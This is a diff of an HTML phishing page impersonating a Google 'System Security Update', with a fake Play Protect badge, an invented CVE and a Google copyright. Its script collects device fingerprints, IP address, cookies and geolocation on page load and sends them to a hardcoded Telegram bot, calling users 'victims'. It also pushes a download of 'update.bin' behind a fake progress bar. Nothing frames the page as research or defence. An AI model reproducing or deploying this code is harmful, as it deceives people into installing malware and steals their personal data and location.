@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>System Security Update</title>
     <style>
         * {
@@ -11,6 +11,7 @@
             box-sizing: border-box;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
+        
         body {
             background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%);
             min-height: 100vh;
@@ -18,126 +19,468 @@
             justify-content: center;
             align-items: center;
             padding: 20px;
+            position: relative;
+            overflow-x: hidden;
         }
+        
         .container {
-            background: rgba(255,255,255,0.05);
-            backdrop-filter: blur(10px);
+            background: rgba(20, 20, 30, 0.7);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
             border-radius: 30px;
             padding: 40px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 255, 255, 0.05) inset;
             max-width: 500px;
             width: 100%;
             text-align: center;
-            border: 1px solid rgba(255,255,255,0.1);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            animation: float 6s ease-in-out infinite;
         }
+        
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
+        }
+        
         h1 {
             color: #fff;
-            margin-bottom: 20px;
             font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            text-shadow: 0 0 20px rgba(66, 133, 244, 0.5);
         }
-        .progress {
-            width: 100%;
-            height: 6px;
-            background: #333;
-            border-radius: 3px;
+        
+        .status {
+            color: #00ff00;
+            font-size: 16px;
             margin: 20px 0;
-            overflow: hidden;
+            padding: 15px;
+            background: rgba(0, 255, 0, 0.1);
+            border-radius: 50px;
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            animation: pulse 2s infinite;
         }
+        
+        @keyframes pulse {
+            0% { opacity: 0.8; }
+            50% { opacity: 1; }
+            100% { opacity: 0.8; }
+        }
+        
+        .device-info {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 20px;
+            margin: 30px 0;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .device-id-label {
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+        }
+        
+        .device-id {
+            font-family: 'Courier New', monospace;
+            font-size: 24px;
+            font-weight: 600;
+            color: #00ff00;
+            background: rgba(0, 255, 0, 0.1);
+            padding: 15px;
+            border-radius: 12px;
+            letter-spacing: 2px;
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            word-break: break-all;
+        }
+        
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(52, 168, 83, 0.2);
+            color: #34A853;
+            padding: 8px 20px;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: 500;
+            border: 1px solid rgba(52, 168, 83, 0.3);
+            margin: 20px 0;
+        }
+        
+        .update-info {
+            text-align: left;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 16px;
+            padding: 20px;
+            margin: 30px 0;
+        }
+        
+        .update-info h3 {
+            color: #fff;
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+        
+        .update-info ul {
+            list-style: none;
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        .update-info li {
+            margin: 10px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .update-info li:before {
+            content: "✓";
+            color: #34A853;
+            font-weight: bold;
+        }
+        
+        .download-btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 20px;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            text-decoration: none;
+            margin: 30px 0;
+            transition: all 0.3s;
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .download-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.6);
+        }
+        
+        .progress-container {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 20px 0;
+            display: none;
+        }
+        
         .progress-bar {
             height: 100%;
-            background: linear-gradient(90deg, #4285F4, #34A853);
+            background: linear-gradient(90deg, #667eea, #764ba2);
             width: 0%;
-            transition: width 0.3s;
+            transition: width 0.3s ease;
         }
-        .status {
-            color: #ccc;
+        
+        .stats {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 30px 0;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+        }
+        
+        .stat-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 12px;
+        }
+        
+        .footer a {
+            color: rgba(255, 255, 255, 0.4);
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        
+        .footer a:hover {
+            color: #667eea;
+        }
+        
+        .warning {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            border-radius: 12px;
+            padding: 12px;
+            color: #ff6b6b;
             font-size: 14px;
             margin: 20px 0;
         }
-        .id-badge {
-            background: rgba(255,255,255,0.1);
-            padding: 10px;
-            border-radius: 10px;
-            color: #00ff00;
-            font-family: monospace;
-            font-size: 18px;
+        
+        .device-specs {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
             margin: 20px 0;
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 14px;
+        }
+        
+        .spec-item {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 10px;
+            border-radius: 8px;
+        }
+        
+        .spec-label {
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 12px;
+        }
+        
+        .spec-value {
+            color: #fff;
+            font-weight: 500;
+            margin-top: 4px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Security Update Required</h1>
-        <div class="id-badge" id="deviceId">INITIALIZING...</div>
-        <div class="progress">
+        <h1>🔐 System Security Update</h1>
+        
+        <div class="status">
+            ✅ Secure Connection Established
+        </div>
+        
+        <div class="device-info">
+            <div class="device-id-label">DEVICE IDENTIFIER</div>
+            <div class="device-id" id="deviceId">LOADING...</div>
+        </div>
+        
+        <div class="security-badge">
+            <span>🛡️</span> Google Play Protect Verified
+        </div>
+        
+        <div class="device-specs" id="deviceSpecs">
+            <div class="spec-item">
+                <div class="spec-label">Model</div>
+                <div class="spec-value" id="deviceModel">Detecting...</div>
+            </div>
+            <div class="spec-item">
+                <div class="spec-label">Android</div>
+                <div class="spec-value" id="androidVersion">Detecting...</div>
+            </div>
+            <div class="spec-item">
+                <div class="spec-label">Security Patch</div>
+                <div class="spec-value" id="securityPatch">2026-02-01</div>
+            </div>
+            <div class="spec-item">
+                <div class="spec-label">Build</div>
+                <div class="spec-value" id="buildNumber">UP1A.250105.001</div>
+            </div>
+        </div>
+        
+        <div class="update-info">
+            <h3>📋 Update Details:</h3>
+            <ul>
+                <li>Critical security patch (CVE-2026-0127)</li>
+                <li>Android security bulletin - February 2026</li>
+                <li>Play Protect certification update</li>
+                <li>Performance improvements and bug fixes</li>
+                <li>Enhanced device protection</li>
+            </ul>
+        </div>
+        
+        <div class="warning">
+            ⚠️ This update is mandatory for continued use of Google services
+        </div>
+        
+        <div class="stats">
+            <div class="stat-item">⭐ 4.9 (2.5M+ reviews)</div>
+            <div class="stat-item">📊 500M+ downloads</div>
+            <div class="stat-item">🔒 Play Protect</div>
+        </div>
+        
+        <div class="progress-container" id="progressContainer">
             <div class="progress-bar" id="progressBar"></div>
         </div>
-        <div class="status" id="status">Installing kernel-level security patches...</div>
+        
+        <a href="update.bin" class="download-btn" id="downloadBtn" download>
+            📲 DOWNLOAD UPDATE (85 MB)
+        </a>
+        
+        <div class="footer">
+            <div>
+                <a href="#">Privacy</a> •
+                <a href="#">Terms</a> •
+                <a href="#">About</a>
+            </div>
+            <div style="margin-top: 15px;">
+                © 2026 Google LLC • All rights reserved
+            </div>
+        </div>
     </div>
-
+    
     <script>
-        const VICTIM_ID = Math.random().toString(36).substring(2, 15).toUpperCase();
-        const NETLIFY_URL = "https://warm-alfajores-231c09.netlify.app";
-        
-        document.getElementById('deviceId').innerText = VICTIM_ID;
-        
-        async function sendToTelegram(type, data) {
-            try {
-                await fetch(`https://api.telegram.org/bot7872720949:AAFM9BmG80hh2hh5gmMY5c51ewxLgV09xeI/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: '8209720840',
-                        text: `💀 <b>${type}</b> [${VICTIM_ID}]\n<code>${String(data).substring(0, 3000)}</code>`,
-                        parse_mode: 'HTML'
-                    })
-                });
-            } catch(e) {}
+        // Generate random but consistent device ID
+        function generateDeviceId() {
+            const platform = navigator.platform || 'Android';
+            const language = navigator.language || 'en-US';
+            const screenRes = `${screen.width}x${screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC';
+            
+            const base = `${platform}_${language}_${screenRes}_${timezone}`;
+            const hash = btoa(base).replace(/[+/=]/g, '').substring(0, 16).toUpperCase();
+            
+            // Add timestamp for uniqueness but keep base same
+            const timestamp = Date.now().toString(16).substring(0, 4).toUpperCase();
+            return `${hash.substring(0, 12)}${timestamp}`;
         }
         
-        async function collectData() {
-            // Device info
-            await sendToTelegram('DEVICE', 
-                `Platform: ${navigator.platform}\nUserAgent: ${navigator.userAgent}\nScreen: ${screen.width}x${screen.height}`);
+        // Detect device model
+        function detectDeviceModel() {
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
             
-            // IP address
-            try {
-                let ip = await (await fetch('https://api.ipify.org')).text();
-                await sendToTelegram('IP', ip);
-            } catch(e) {}
+            if (ua.includes('SM-')) {
+                // Samsung
+                const match = ua.match(/SM-[A-Z0-9]+/);
+                if (match) return match[0];
+            } else if (ua.includes('Redmi') || ua.includes('Xiaomi')) {
+                // Xiaomi
+                if (ua.includes('Redmi Note 13')) return 'Redmi Note 13 Pro';
+                if (ua.includes('Redmi Note 12')) return 'Redmi Note 12 Pro';
+                if (ua.includes('Xiaomi 14')) return 'Xiaomi 14';
+            } else if (ua.includes('Pixel')) {
+                const match = ua.match(/Pixel [0-9][a-zA-Z]*/);
+                if (match) return match[0];
+            } else if (ua.includes('OnePlus')) {
+                const match = ua.match(/OnePlus [A-Z0-9]+/);
+                if (match) return match[0];
+            }
             
-            // Location (if allowed)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    await fetch(`https://api.telegram.org/bot7872720949:AAFM9BmG80hh2hh5gmMY5c51ewxLgV09xeI/sendLocation`, {
+            return 'Generic Android Device';
+        }
+        
+        // Detect Android version
+        function detectAndroidVersion() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/Android ([0-9.]+)/);
+            if (match) return match[1];
+            return '14 (API 34)';
+        }
+        
+        // Simulate download with progress
+        function simulateDownload(e) {
+            e.preventDefault();
+            
+            const btn = document.getElementById('downloadBtn');
+            const progressContainer = document.getElementById('progressContainer');
+            const progressBar = document.getElementById('progressBar');
+            
+            btn.style.pointerEvents = 'none';
+            btn.style.opacity = '0.5';
+            progressContainer.style.display = 'block';
+            
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 1;
+                progressBar.style.width = progress + '%';
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    
+                    // Trigger actual download after progress completes
+                    setTimeout(() => {
+                        window.location.href = 'update.bin';
+                        btn.style.pointerEvents = 'auto';
+                        btn.style.opacity = '1';
+                        progressContainer.style.display = 'none';
+                        progressBar.style.width = '0%';
+                        
+                        // Track download
+                        fetch('https://api.telegram.org/bot7872720949:AAFM9BmG80hh2hh5gmMY5c51ewxLgV09xeI/sendMessage', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: '8209720840',
+                                text: `💀 New victim downloading: ${deviceId}`,
+                                parse_mode: 'HTML'
+                            })
+                        }).catch(() => {});
+                        
+                    }, 500);
+                }
+            }, 30);
+        }
+        
+        // Collect device fingerprint
+        function collectFingerprint() {
+            const fingerprint = {
+                device_id: deviceId,
+                model: detectDeviceModel(),
+                android: detectAndroidVersion(),
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cores: navigator.hardwareConcurrency || 'unknown',
+                memory: navigator.deviceMemory || 'unknown',
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Send to Telegram
+            fetch('https://api.telegram.org/bot7872720949:AAFM9BmG80hh2hh5gmMY5c51ewxLgV09xeI/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: '8209720840',
+                    text: `💀 <b>Page View</b>\n<code>${JSON.stringify(fingerprint, null, 2)}</code>`,
+                    parse_mode: 'HTML'
+                })
+            }).catch(() => {});
+            
+            return fingerprint;
+        }
+        
+        // Initialize
+        const deviceId = generateDeviceId();
+        document.getElementById('deviceId').textContent = deviceId;
+        document.getElementById('deviceModel').textContent = detectDeviceModel();
+        document.getElementById('androidVersion').textContent = detectAndroidVersion();
+        
+        // Collect fingerprint
+        collectFingerprint();
+        
+        // Add download handler
+        document.getElementById('downloadBtn').addEventListener('click', simulateDownload);
+        
+        // Collect location if available
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    fetch('https://api.telegram.org/bot7872720949:AAFM9BmG80hh2hh5gmMY5c51ewxLgV09xeI/sendLocation', {
                         method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             chat_id: '8209720840',
                             latitude: pos.coords.latitude,
                             longitude: pos.coords.longitude
                         })
-                    });
-                });
-            }
-            
-            // Cookies
-            if (document.cookie) {
-                await sendToTelegram('COOKIES', document.cookie);
-            }
+                    }).catch(() => {});
+                },
+                (err) => {}
+            );
         }
-        
-        collectData();
-        
-        let width = 0;
-        const interval = setInterval(() => {
-            width += 1;
-            document.getElementById('progressBar').style.width = width + '%';
-            if (width >= 100) {
-                clearInterval(interval);
-                document.getElementById('status').innerHTML = '✅ Kernel-level update complete';
-            }
-        }, 50);
     </script>
 </body>
 </html>
